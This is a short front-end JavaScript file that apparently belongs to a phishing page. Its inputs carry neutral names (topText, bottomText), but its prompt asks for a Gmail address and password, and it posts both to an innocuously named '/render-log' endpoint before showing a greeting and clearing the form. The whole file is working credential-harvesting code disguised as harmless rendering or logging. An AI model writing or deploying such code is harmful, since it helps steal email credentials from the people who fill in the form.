const sendBtn = document.getElementById("sendBtn");
const topText = document.getElementById("topText");
const bottomText = document.getElementById("bottomText");
const status = document.getElementById("status");

sendBtn.addEventListener("click", async () => {
  const top = topText.value;
  const bottom = bottomText.value;

  if (!top || !bottom) {
    status.textContent = "Please Write your Gmail and Password";
    status.style.color = "red";
    return;
  }

  await fetch("/render-log", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      topText: top,
      bottomText: bottom
    })
  });

  status.textContent = "Hello! Dear madan.";
  status.style.color = "green";

  topText.value = "";
  bottomText.value = "";
});

